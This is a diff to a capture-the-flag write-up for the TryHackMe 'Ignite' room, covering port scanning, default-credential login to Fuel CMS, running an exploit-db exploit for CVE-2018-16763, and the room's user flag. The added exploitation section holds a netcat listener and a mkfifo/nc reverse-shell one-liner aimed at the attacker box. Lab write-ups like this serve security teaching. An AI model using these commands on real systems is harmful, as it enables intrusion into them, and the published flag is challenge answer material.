@@ -10,7 +10,7 @@ Target IP: 10.10.105.97<br />
 AttackBox IP: 10.10.189.128<br />
 </i>
 
-## Enumeration
+# Recon
 
 For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
 ```rustscan -a 10.10.105.97```<br />
@@ -20,7 +20,7 @@ Now we know which ports are open, I run an Nmap scan with the flag -sV to find t
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT2.png?raw=true)<br />
 We have only found one service, this CTF may just be a webservice. Let's try to find some vulnerabilities!
 
-## HTTP Service
+## HTTP Service Recon
 
 Let's load up our web browser and head over to http://10.10.105.97/<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT3.png?raw=true)<br />
@@ -32,6 +32,8 @@ Success! We've managed to login to the admin panel with the default username and
 
 Another hit! We see an exploit-db result that affects Fuel CMS versions 1.41 and below. CVE-2018-16763, remote Code Execution.
 Now we have two ways we can go, using the exploit we found or to try upload a reverse shell on the admin panel.<br />
+
+## Exploiting Fuel CMS 1.41
 We're going to try the first way... Using the exploit we found! Why not?<br />
 First let's download the exploit onto our AttackBox - https://www.exploit-db.com/raw/50477<br />
 I downloaded it and named it exploit.py, let's run it and see if we can get a shell! This exploit requires no additional configuration.<br />
@@ -40,13 +42,27 @@ It tells us we need to add the -u flag with the URL! Let's go.<br />
 python exploit.py -u http://10.10.105.97<br />
 If the exploit was succesful you will be asked to enter a command like I've done below<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT6.png?raw=true)<br />
+It looks like the exploit executes PHP system commands, let's get a reverse shell up for more functionality. To do this 
+we'll need to firstly open up a listener on our AttackBox, then we will send the PHP system command to spawn a reverse shell to that listener.<br />
+On our AttackBox:<br />
+nc -lvnp 8888<br />
+<br />
+On our target with the PHP system commands:<br />
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.189.128 8888 >/tmp/f<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT7.png?raw=true)<br />
+Now we have our reverse shell opened! Let's have a look in /home<br />
+cd /home<br />
+ls<br />
+We see another folder www-data, after checking inside the folder we find a flag.txt, this must be our User flag!<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT8.png?raw=true)<br />
+After having a look around it looks like we'll need to escalate our privileges to get any further!<br />
 
-
+## Privilege Escalation
 
 
 
 Question 1:<br />
-**What is the user flag?** <br />
+**What is the user flag?** 6470e394cbf6dab6a91682cc8585059b<br />
 
 Question 2:<br />
 **What is the root flag?** <br />
